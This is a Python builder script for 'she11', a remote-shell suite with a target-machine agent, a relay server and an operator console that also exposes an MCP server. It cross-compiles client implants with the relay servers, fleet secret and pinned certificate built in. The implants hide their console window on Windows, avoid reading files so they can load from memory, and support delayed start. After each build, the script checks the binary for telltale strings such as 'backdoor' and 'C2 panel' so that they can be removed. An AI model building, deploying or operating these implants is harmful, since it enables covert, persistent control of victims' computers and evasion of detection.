#!/usr/bin/env python3
"""builder.py - cross-platform compiler for the she11 suite.

usage: builder.py <role> [options]        role = client | server | commander
       builder.py gencert [options]
       builder.py -h | --help
"""

import argparse
import ctypes
import os
import pathlib
import platform
import shutil
import subprocess
import sys
import textwrap
import time

ROOT = pathlib.Path(__file__).resolve().parent
GENCFG = ROOT / "builder-tools" / "genconfig.py"
CONFIG_DIR = ROOT / "config"
CONFIG_TEMPLATES = {
    "server": CONFIG_DIR / "she11_server.toml",
    "commander": CONFIG_DIR / "she11_commander.toml",
}

# ---------------------------------------------------------------------------
# terminal styling
# ---------------------------------------------------------------------------
# Decorations stay ASCII-only: help output is often redirected to a file, and a
# non-UTF-8 pipe must not turn a box-drawing character into an encode error.

RESET = "\x1b[0m"
BOLD = "\x1b[1m"
RED = "\x1b[31m"
GREEN = "\x1b[32m"
YELLOW = "\x1b[33m"
CYAN = "\x1b[36m"
GRAY = "\x1b[90m"


def _enable_windows_vt() -> bool:
    """Enable ANSI escape processing for this console (stdout and stderr)."""
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        enabled = True
        for std_handle in (-11, -12):  # STD_OUTPUT_HANDLE, STD_ERROR_HANDLE
            handle = kernel32.GetStdHandle(std_handle)
            mode = ctypes.c_uint32()
            if not kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                enabled = False
                continue
            if not mode.value & 0x0004:  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
                if not kernel32.SetConsoleMode(handle, mode.value | 0x0004):
                    enabled = False
        return enabled
    except Exception:
        return False


def _detect_color() -> bool:
    forced = os.environ.get("BUILDER_COLOR", "").lower() in ("1", "always", "force")
    if os.environ.get("NO_COLOR") and not forced:
        return False
    if os.environ.get("CLICOLOR") == "0" and not forced:
        return False
    if os.environ.get("TERM") == "dumb":
        return False
    stream = sys.stdout
    is_tty = hasattr(stream, "isatty") and stream.isatty()
    if not is_tty and not forced:
        return False
    if forced:
        return True
    return _enable_windows_vt()


COLOR = _detect_color()


def paint(text, *codes) -> str:
    if not COLOR or not codes:
        return str(text)
    return "".join(codes) + str(text) + RESET


def title(text) -> str:
    return paint(text, BOLD, CYAN)


def bold(text) -> str:
    return paint(text, BOLD)


def accent(text) -> str:
    return paint(text, CYAN)


def gray(text) -> str:
    return paint(text, GRAY)


def green(text) -> str:
    return paint(text, GREEN)


def yellow(text) -> str:
    return paint(text, YELLOW)


def red(text) -> str:
    return paint(text, RED)


def row(key: str, value: str, width: int = 11) -> None:
    print("  " + gray(key.ljust(width)) + value)


def step(index: int, total: int, name: str) -> None:
    print()
    print(paint(f"[{index}/{total}]", BOLD, CYAN) + " " + bold(name))


def human_size(count: int) -> str:
    size = float(count)
    for unit in ("B", "KiB", "MiB", "GiB"):
        if size < 1024 or unit == "GiB":
            return f"{size:.0f} {unit}" if unit == "B" else f"{size:.1f} {unit}"
        size /= 1024
    return f"{count} B"


def redacted(cmd) -> str:
    """Command line safe to print: fleet secrets never reach the console."""
    shown = []
    hide_next = False
    for part in cmd:
        text = str(part)
        if hide_next:
            shown.append("<redacted>")
            hide_next = False
            continue
        if text in ("--magic", "--commander-password"):
            shown.append(text)
            hide_next = True
            continue
        if text.startswith("--magic=") or text.startswith("--commander-password="):
            shown.append(text.split("=", 1)[0] + "=<redacted>")
            continue
        shown.append(text)
    return " ".join(shown)


def run(cmd, **kwargs):
    print("  " + gray("$ " + redacted(cmd)))
    return subprocess.run(cmd, check=True, **kwargs)


def die(message: str, hint: str = None, code: int = 1):
    print(red("error:") + " " + message, file=sys.stderr)
    if hint:
        print("  " + gray(hint), file=sys.stderr)
    raise SystemExit(code)


# ---------------------------------------------------------------------------
# help rendering
# ---------------------------------------------------------------------------


def _options(rows, width: int = 30, total: int = 96) -> str:
    """Two-column option table with hanging indent for wrapped descriptions."""
    text_width = max(24, total - 2 - width)
    hanging = " " * (2 + width)
    out = []
    for flag, desc in rows:
        pad = " " * max(2, width - len(flag))
        lines = textwrap.wrap(desc, width=text_width) or [""]
        out.append("  " + accent(flag) + pad + lines[0])
        for extra in lines[1:]:
            out.append(hanging + extra)
    return "\n".join(out)


class _Heading(str):
    """A section title: the block that follows it sits directly underneath."""


def H(name: str) -> _Heading:
    return _Heading(bold(name))


def para(text: str, width: int = 94) -> str:
    """Indented paragraph, wrapped to the same right margin as the tables."""
    return textwrap.fill(text, width=width, initial_indent="  ", subsequent_indent="  ")


def _body(*blocks) -> str:
    out = []
    prev = None
    for block in blocks:
        if prev is not None:
            out.append("\n" if isinstance(prev, _Heading) else "\n\n")
        out.append(block)
        prev = block
    return "".join(out) + "\n"


def _default_target() -> str:
    return "windows" if sys.platform == "win32" else "linux"


def _default_arch() -> str:
    return "arm64" if platform.machine().lower() in ("aarch64", "arm64") else "amd64"


def _common_rows():
    return [
        ("--target {linux,windows}",
         f"Target operating system. Default: this machine ({_default_target()})."),
        ("-a, --arch {amd64,arm64}",
         f"Target CPU architecture. Default: this machine ({_default_arch()})."),
        ("--debug",
         "Unoptimized build. A Windows client keeps its console so logx output is visible; "
         "server and commander always keep one."),
        ("-o, --out PATH",
         "Output path. Default: ./she11_<role>_<os>_<arch>[.exe], with a _dbg suffix when "
         "--debug is set."),
        ("--mutex NAME",
         "Compile a single-instance mutex: a second launch exits with code 9. Default: none."),
        ("--server-cert PATH",
         "Server certificate embedded as the trust anchor. Required for client and commander; "
         "the peer must present the same certificate."),
        ("--gen-config",
         "Also copy config/she11_<role>.toml next to the binary as she11_<role>.toml. "
         "An existing file is replaced. server and commander only; ignored for client."),
    ]


def _footer() -> str:
    return gray("Color is disabled automatically when output is redirected, or with NO_COLOR=1.")


def top_help() -> str:
    roles = [
        ("client", "Target-machine agent. Outbound tcp/udp; magic, server list and pinned "
                   "certificate are compiled in."),
        ("server", "Relay server. Starting the server requires specified configuration or a TOML configuration file."),
        ("commander", "Operator console: CLI plus MCP server (stdio and HTTP). Embeds the "
                      "pinned certificate."),
        ("gencert", "Generate the self-signed TLS keypair and print its SHA-256 fingerprint."),
    ]
    pipeline = [
        ("1. generate", "src/shared/gen/config_gen.go from the flags (client and commander only)."),
        ("2. compile", "go build -trimpath, CGO disabled, symbols stripped."),
        ("3. verify", "module dependency summary plus a sensitive-literal scan."),
        ("4. report", "output path, size and elapsed time."),
    ]
    return _body(
        title("she11 builder") + "  " + gray("cross-platform compiler"),
        para("One command per role: inject build-time configuration, cross-compile, then verify "
             "the artifact. Everything a client needs at runtime is compiled in."),
        H("USAGE"),
        "  python builder.py <role> [options]\n"
        "  python builder.py <role> -h          " + gray("options for one role"),
        H("ROLES"),
        _options(roles, width=12),
        H("QUICK START"),
        "  " + accent("python builder.py gencert --out config/server.crt --key config/server.key") + "\n"
        "  " + accent("python builder.py server --target linux -a amd64 ") + "\n"
        "  " + accent("python builder.py client --target windows -a amd64 --server-cert config/server.crt ") + "\n"
        "      " + accent("--magic \"0000000000000000\" --udp-server-list \"server.example.com:2077\" ") + "\n"
        "      " + accent("--ip-protocol prefer-ipv4") + "\n"
        "  " + accent("python builder.py commander --target windows -a amd64 --server-cert config/server.crt"),
        H("WHAT A BUILD DOES"),
        _options(pipeline, width=13),
        H("ENVIRONMENT"),
        _options([
            ("NO_COLOR=1", "Disable color. Color is also off whenever stdout is not a terminal."),
            ("CLICOLOR=0", "Same effect, for shells that use the CLICOLOR convention."),
            ("BUILDER_COLOR=1", "Force color even when piped (useful with a pager)."),
        ], width=17),
        _footer(),
    )


def client_help() -> str:
    return _body(
        title("she11 builder") + " " + gray("/") + " " + bold("client"),
        para("Target-machine agent: outbound only, zero runtime files. The fleet magic, server "
             "list and pinned certificate are compiled into the binary."),
        para("Required: --server-cert, --magic, at least one server list, --ip-protocol."),
        H("USAGE"),
        "  python builder.py client --server-cert PATH --magic STRING \n"
        "      (--udp-server-list LIST | --tcp-server-list LIST) --ip-protocol MODE [options]",
        H("COMMON OPTIONS"),
        _options(_common_rows()),
        H("CLIENT OPTIONS"),
        _options([
            ("--magic STRING",
             "Fleet magic, at least 16 characters. The server compares it in constant time "
             "and rejects a mismatch."),
            ("--udp-server-list LIST",
             "QUIC servers, comma separated \"host:port\". IPv6 literals go in brackets: "
             "\"[2026:abcd::1]:2077\"."),
            ("--tcp-server-list LIST",
             "TLS/TCP servers, same syntax. At least one of the udp/tcp lists is required; "
             "both may be given."),
            ("--ip-protocol MODE",
             "ipv4 | ipv6 | prefer-ipv4 | prefer-ipv6. No default: the operator decides "
             "which address families to try."),
            ("--dns LIST",
             "Plaintext resolvers, \"1.1.1.1,8.8.8.8\". Default: system DNS."),
            ("--doh LIST",
             "DNS-over-HTTPS URLs. Mutually exclusive with --dns."),
            ("--dns-timeout SEC",
             "Per-resolver timeout. Default: 5."),
            ("--allow-dns-fallback",
             "After every configured resolver fails, try system DNS. Default: off."),
            ("-t, --handshake-timeout SEC",
             "Per-candidate dial and handshake window. Default: 5."),
            ("--loop-delay SEC",
             "Cooldown per (server, transport) round. Default: 60."),
            ("--delay-start SEC",
             "Wait before the first connection round. Default: 0."),
            ("--max-shell N",
             "Local session cap; 0 or omitted means unlimited."),
        ]),
        H("NOTES"),
        para("Android/Termux: build with --dns or --doh. Go's resolver cannot use Android's "
             "netd; without an explicit resolver the client retries forever and never "
             "registers. Termux targets linux/arm64."),
        para("The binary never reads a file at runtime: certificate, magic, servers and "
             "timeouts are code variables, which keeps it loadable from memory."),
        H("EXAMPLE"),
        "  " + accent("python builder.py client --target linux -a arm64 ") + "\n"
        "      " + accent("--server-cert config/server.crt --magic \"<16+ chars>\" ") + "\n"
        "      " + accent("--udp-server-list \"server.example.com:2077\" --ip-protocol prefer-ipv4 ") + "\n"
        "      " + accent("--dns \"1.1.1.1,8.8.8.8\" --max-shell 10"),
        _footer(),
    )


def server_help() -> str:
    return _body(
        title("she11 builder") + " " + gray("/") + " " + bold("server"),
        para("Relay server: authenticates both planes, keeps the client registry and copies "
             "bytes between peers. It never interprets commands."),
        H("USAGE"),
        "  python builder.py server [--target OS] [-a ARCH] [options]",
        H("COMMON OPTIONS"),
        _options(_common_rows()),
        H("RUNTIME CONFIGURATION"),
        para("Listen addresses, accepted magics, the commander password, limits and logging "
             "are runtime settings: CLI flags or she11_server.toml. Nothing is baked into "
             "this binary."),
        para("Add --gen-config to the build to drop a fully commented starting point next to "
             "the binary. Every value in that template is a placeholder, including the "
             "listen addresses, so it cannot serve traffic until it is edited."),
        H("EXAMPLE"),
        "  " + accent("python builder.py server --target linux -a amd64 --mutex she11_server") + "\n"
        "      " + accent("-o bin/she11_server_linux_amd64"),
        _footer(),
    )


def commander_help() -> str:
    return _body(
        title("she11 builder") + " " + gray("/") + " " + bold("commander"),
        para("Operator console: interactive shell, one-shot exec and the MCP server (stdio "
             "and HTTP). server addresses and passwords are runtime settings."),
        para("Required: --server-cert."),
        H("USAGE"),
        "  python builder.py commander --server-cert PATH [options]",
        H("COMMON OPTIONS"),
        _options(_common_rows()),
        H("RUNTIME CONFIGURATION"),
        para("servers, the commander password, the default shell and MCP mode come from "
             "she11_commander.toml or CLI flags. The certificate is the only build-time input."),
        para("Add --gen-config to the build to drop a fully commented starting point next to "
             "the binary. Its server address and password are placeholders."),
        H("EXAMPLE"),
        "  " + accent("python builder.py commander --target windows -a amd64 ") + "\n"
        "      " + accent("--server-cert config/server.crt -o bin/she11_commander_windows_amd64.exe"),
        _footer(),
    )


def gencert_help() -> str:
    return _body(
        title("she11 builder") + " " + gray("/") + " " + bold("gencert"),
        para("Generate the self-signed TLS keypair used by every she11 role, then print its "
             "SHA-256 fingerprint for the record."),
        H("USAGE"),
        "  python builder.py gencert [--out PATH] [--key PATH] [--days N]",
        H("OPTIONS"),
        _options([
            ("--out CRTPATH", "Certificate output path. Default: ./server.crt"),
            ("--key KEYPATH", "Private key output path. Default: ./server.key"),
            ("--days N", "Validity in days. Default: 3650"),
        ]),
        H("NOTES"),
        para("The pair is Ed25519 and self-signed. Client and commander embed the certificate "
             "body, so rotating it means rebuilding both."),
        para("Keep the private key at mode 600 and out of shared reports."),
        _footer(),
    )


# ---------------------------------------------------------------------------
# build steps
# ---------------------------------------------------------------------------


def output_path(role: str, target: str, arch: str, debug: bool, out: str) -> pathlib.Path:
    if out:
        path = pathlib.Path(out)
        return path if path.is_absolute() else (ROOT / path)
    suffix = ".exe" if target == "windows" else ""
    name = f"she11_{role}_{target}_{arch}" + ("_dbg" if debug else "") + suffix
    return ROOT / name


def go_build(role, target, arch, debug, out, mutex, extra_ldflags):
    env = dict(os.environ)
    env["GOOS"] = target
    env["GOARCH"] = arch
    env["CGO_ENABLED"] = "0"
    ldflags = ["-s", "-w"]
    if mutex:
        ldflags.append(f"-X main.mutexName={mutex}")
    if role == "client" and target == "windows" and not debug:
        ldflags.append("-H windowsgui")
    ldflags.extend(extra_ldflags)
    tags = []
    if debug:
        tags.append("debug")
    cmd = ["go", "build"]
    if tags:
        cmd += ["-tags", ",".join(tags)]
    cmd += ["-trimpath", "-ldflags", " ".join(ldflags)]
    final = output_path(role, target, arch, debug, out)
    cmd += ["-o", str(final)]
    cmd.append(f"./src/cmd/she11_{role}/")
    run(cmd, cwd=ROOT, env=env)
    return final


def check_artifact(path: pathlib.Path) -> None:
    if not path.exists():
        print("  " + yellow("WARN:") + f" artifact not found at {path}")
        return
    module = subprocess.run(["go", "version", "-m", str(path)],
                            capture_output=True, text=True)
    if "quic-go" in module.stdout or "yamux" in module.stdout:
        first = module.stdout.splitlines()[0] if module.stdout else ""
        toolchain = first.rsplit(": ", 1)[-1] if ": " in first else first
        modules = sum(1 for line in module.stdout.splitlines()
                      if line.startswith("\tdep\t") or line.startswith("\tmod\t"))
        label = "module" if modules == 1 else "modules"
        row("deps", gray(f"{toolchain}, {modules} {label}"))
    data = path.read_bytes()
    for bad in [b"reverse shell", b"backdoor ", b"C2 panel", b"payload.exe"]:
        if bad in data.lower():
            print("  " + yellow("WARN:") + " sensitive literal in binary: " + red(bad.decode()))


def describe_injection(role, args):
    if role == "client":
        relays = []
        for label, value in (("udp", args.udp_server_list), ("tcp", args.tcp_server_list)):
            count = len([x for x in value.split(",") if x.strip()]) if value else 0
            if count:
                relays.append(f"{count} {label}")
        resolver = "system DNS"
        if args.dns:
            resolver = "plain " + args.dns
        elif args.doh:
            resolver = "DoH"
        row("magic", f"set ({len(args.magic)} chars)")
        row("relays", ", ".join(relays))
        row("resolver", resolver)
        row("cert", args.server_cert)
        row("shell cap", str(args.max_shell) if args.max_shell else "unlimited")
    else:
        row("cert", args.server_cert)


def _template_problems(role, data) -> list:
    """Keys the template must contain so a copied file is a complete starting point."""
    missing = []
    if role == "server":
        for key in ("identity", "listen", "tls", "auth", "limits", "log"):
            if key not in data:
                missing.append(key)
        listen = data.get("listen") or {}
        for plane in ("client", "commander"):
            entries = listen.get(plane)
            if not isinstance(entries, list) or not entries:
                missing.append(f"listen.{plane} (at least one entry)")
        tls = data.get("tls") or {}
        for key in ("cert", "key"):
            if not tls.get(key):
                missing.append(f"tls.{key}")
        auth = data.get("auth") or {}
        if not isinstance(auth.get("magic_list"), list) or not auth.get("magic_list"):
            missing.append("auth.magic_list")
        if not auth.get("commander_password"):
            missing.append("auth.commander_password")
    else:
        for key in ("general", "server", "mcp"):
            if key not in data:
                missing.append(key)
        servers = data.get("server")
        if not isinstance(servers, list) or not servers:
            missing.append("server (at least one [[server]])")
        else:
            for index, entry in enumerate(servers):
                for key in ("addr", "password"):
                    if not isinstance(entry, dict) or not entry.get(key):
                        missing.append(f"server[{index}].{key}")
        mode = (data.get("mcp") or {}).get("mode")
        if mode not in ("off", "stdio", "http"):
            missing.append("mcp.mode (off | stdio | http)")
    return missing


def config_template(role) -> pathlib.Path:
    """Validate the template before compiling, so a broken one fails fast."""
    path = CONFIG_TEMPLATES[role]
    if not path.exists():
        die(f"config template not found: {path}",
            "hint: config/ ships with the repository")
    try:
        import tomllib
    except ImportError:
        print("  " + yellow("note:") + gray(" config template not validated (Python < 3.11)"))
        return path
    try:
        with path.open("rb") as handle:
            data = tomllib.load(handle)
    except Exception as error:
        die(f"config template is not valid TOML: {path}: {error}")
    problems = _template_problems(role, data)
    if problems:
        die("config template is missing required keys: " + ", ".join(problems),
            f"hint: fix {path}")
    return path


def install_config(template: pathlib.Path, directory: pathlib.Path):
    dest = directory / template.name
    replaced = dest.exists()
    shutil.copyfile(template, dest)
    return dest, replaced


def build(args):
    role = args.command
    if role == "client":
        if not args.magic or len(args.magic) < 16:
            die("client: --magic is required (>=16 chars)",
                "hint: python builder.py client -h")
        if not args.udp_server_list and not args.tcp_server_list:
            die("client: --udp-server-list or --tcp-server-list is required",
                "hint: python builder.py client -h")
        if not args.ip_protocol:
            die("client: --ip-protocol is required",
                "hint: python builder.py client -h")
        if args.dns and args.doh:
            die("client: --dns and --doh are mutually exclusive",
                "hint: python builder.py client -h")
    if role in ("client", "commander"):
        if not args.server_cert:
            die(f"{role}: --server-cert is required",
                f"hint: python builder.py {role} -h")

    gen_args = None
    if role in ("client", "commander"):
        gen_args = [sys.executable, str(GENCFG), "--role", role,
                    "--server-cert", args.server_cert]
    if role == "client":
        gen_args += [
            "--magic", args.magic,
            "--udp-servers", args.udp_server_list or "",
            "--tcp-servers", args.tcp_server_list or "",
            "--ip-protocol", args.ip_protocol,
            "--dns", args.dns or "",
            "--doh", args.doh or "",
            "--dns-timeout", str(args.dns_timeout),
            "--handshake-timeout", str(args.handshake_timeout),
            "--loop-delay", str(args.loop_delay),
            "--delay-start", str(args.delay_start),
            "--max-shell", str(args.max_shell),
            "--mutex", args.mutex or "",
        ]
        if args.allow_dns_fallback:
            gen_args.append("--dns-allow-fallback")
    elif gen_args is not None:
        gen_args += ["--mutex", args.mutex or ""]

    target_path = output_path(role, args.target, args.arch, args.debug, args.out)
    write_config = bool(getattr(args, "gen_config", False)) and role in CONFIG_TEMPLATES
    template = config_template(role) if write_config else None
    total = 2 + (1 if gen_args is not None else 0) + (1 if write_config else 0)
    started = time.monotonic()

    print()
    print(title("she11 builder") + gray(" / ") + bold(role))
    row("target", f"{args.target}/{args.arch}" + gray(" (debug)" if args.debug else " (release)"))
    row("output", str(target_path))
    if args.mutex:
        row("mutex", args.mutex)
    if getattr(args, "gen_config", False) and role not in CONFIG_TEMPLATES:
        row("config", gray("--gen-config ignored (client has no runtime config)"))

    index = 0
    if gen_args is not None:
        index += 1
        step(index, total, "inject build configuration")
        run(gen_args, cwd=ROOT)
        describe_injection(role, args)

    index += 1
    step(index, total, "compile")
    go_build(role, args.target, args.arch, args.debug, args.out, args.mutex, [])

    index += 1
    step(index, total, "verify")
    check_artifact(target_path)
    if not target_path.exists():
        die(f"artifact missing: {target_path}")
    elapsed = time.monotonic() - started
    size = human_size(target_path.stat().st_size)
    print("  " + green("ok") + gray(f"  {size} in {elapsed:.1f}s"))

    if write_config:
        index += 1
        step(index, total, "write runtime config template")
        dest, replaced = install_config(template, target_path.parent)
        row("config", str(dest))
        if replaced:
            print("  " + yellow("note:") + " existing file replaced")

    print()
    print(green("built") + f" she11_{role} for {args.target}/{args.arch} -> " + gray(str(target_path)))
    print()


def gencert(args):
    tmp_out = ROOT / "gencert.exe" if sys.platform == "win32" else ROOT / "gencert"
    print()
    print(title("she11 builder") + gray(" / ") + bold("gencert"))
    row("cert", args.out)
    row("key", args.key)
    row("validity", f"{args.days} days")
    print()
    run(["go", "build", "-o", str(tmp_out), "./src/cmdtools/gencert/"], cwd=ROOT)
    try:
        run([str(tmp_out), "--out", args.out, "--key", args.key, "--days", str(args.days)], cwd=ROOT)
    finally:
        try:
            tmp_out.unlink()
        except OSError:
            pass
    print()
    print(green("done") + " keypair written; clients must be rebuilt to pin a new certificate")
    print()


# ---------------------------------------------------------------------------
# argument parsing
# ---------------------------------------------------------------------------


class BuilderParser(argparse.ArgumentParser):
    def error(self, message):
        self.print_usage(sys.stderr)
        print(red("error:") + " " + message, file=sys.stderr)
        print("  " + gray("run 'python builder.py <role> -h' for the option list"), file=sys.stderr)
        raise SystemExit(2)


def attach_help(parser, text: str) -> None:
    parser.format_help = lambda: text


def main():
    ap = BuilderParser(prog="builder.py", add_help=True)
    attach_help(ap, top_help())
    sub = ap.add_subparsers(dest="command", parser_class=BuilderParser)

    def add_common(p):
        p.add_argument("--target", choices=["linux", "windows"],
                       help="target OS (default: current OS)")
        p.add_argument("-a", "--arch", choices=["amd64", "arm64"],
                       help="target CPU arch, single (default: current arch)")
        p.add_argument("--debug", action="store_true",
                       help="debug build: no optimization; client keeps console")
        p.add_argument("-o", "--out", default="",
                       help="output binary path (default: auto-named in cwd)")
        p.add_argument("--mutex", default="",
                       help="compile a single-instance mutex (default: none)")
        p.add_argument("--server-cert", default="",
                       help="server TLS cert, embedded as the pin/trust anchor")
        p.add_argument("--gen-config", action="store_true",
                       help="copy the config template next to the binary (server/commander)")

    pc = sub.add_parser("client")
    attach_help(pc, client_help())
    add_common(pc)
    pc.add_argument("--magic", default="")
    pc.add_argument("--udp-server-list", default="")
    pc.add_argument("--tcp-server-list", default="")
    pc.add_argument("--ip-protocol", default="",
                    choices=["ipv4", "ipv6", "prefer-ipv6", "prefer-ipv4"])
    pc.add_argument("--dns", default="")
    pc.add_argument("--doh", default="")
    pc.add_argument("--dns-timeout", type=int, default=5)
    pc.add_argument("--allow-dns-fallback", action="store_true")
    pc.add_argument("-t", "--handshake-timeout", type=int, default=5)
    pc.add_argument("--loop-delay", type=int, default=60)
    pc.add_argument("--delay-start", type=int, default=0)
    pc.add_argument("--max-shell", type=int, default=0)
    pc.set_defaults(func=build)

    ps = sub.add_parser("server")
    attach_help(ps, server_help())
    add_common(ps)
    ps.set_defaults(func=build)

    pm = sub.add_parser("commander")
    attach_help(pm, commander_help())
    add_common(pm)
    pm.set_defaults(func=build)

    pg = sub.add_parser("gencert")
    attach_help(pg, gencert_help())
    pg.add_argument("--out", default="server.crt")
    pg.add_argument("--key", default="server.key")
    pg.add_argument("--days", type=int, default=3650)
    pg.set_defaults(func=gencert)

    args = ap.parse_args()
    if not getattr(args, "command", None):
        ap.print_help()
        return 2
    if args.command == "gencert":
        args.func(args)
        return 0
    if not args.target:
        args.target = "windows" if sys.platform == "win32" else "linux"
    if not args.arch:
        args.arch = _default_arch()
    args.func(args)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except subprocess.CalledProcessError as error:
        name = pathlib.Path(str(error.cmd[0])).name
        print(red("error:") + f" {name} exited with code {error.returncode}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n" + yellow("interrupted"), file=sys.stderr)
        sys.exit(130)
